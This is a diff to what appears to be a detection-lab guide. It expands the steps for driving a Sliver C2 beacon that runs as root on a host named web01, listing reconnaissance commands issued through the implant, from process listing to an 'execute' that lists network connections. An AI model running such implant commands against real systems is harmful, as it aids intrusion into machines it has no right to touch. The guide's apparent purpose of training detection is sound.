@@ -504,11 +504,20 @@ dc189fbc  dragonrx_beacon  http       web01     root      linux/amd64  5s ago   
 **Interact with the beacon:**
 ```bash
 sliver > use dragonrx_beacon
-sliver (dragonrx_beacon) > whoami
-# [*] Tasked beacon: whoami
-# root
-sliver (dragonrx_beacon) > getpid
-sliver (dragonrx_beacon) > ifconfig
+
+# Sliver built-in commands (no 'execute' needed):
+sliver (dragonrx_beacon) > whoami        # current user
+sliver (dragonrx_beacon) > getpid        # beacon PID
+sliver (dragonrx_beacon) > ifconfig      # network interfaces
+sliver (dragonrx_beacon) > ps            # process list
+sliver (dragonrx_beacon) > cat /etc/hosts
+
+# Arbitrary OS commands — use 'execute -o':
+sliver (dragonrx_beacon) > execute -o -- id
+sliver (dragonrx_beacon) > execute -o -- uname -a
+sliver (dragonrx_beacon) > execute -o -- /bin/bash -c "ss -antup | grep -v 127.0.0.1"
+
+# Note: beacon commands are async — output arrives on the next check-in (~30s)
 ```
 
 **SIEM alert fired:**
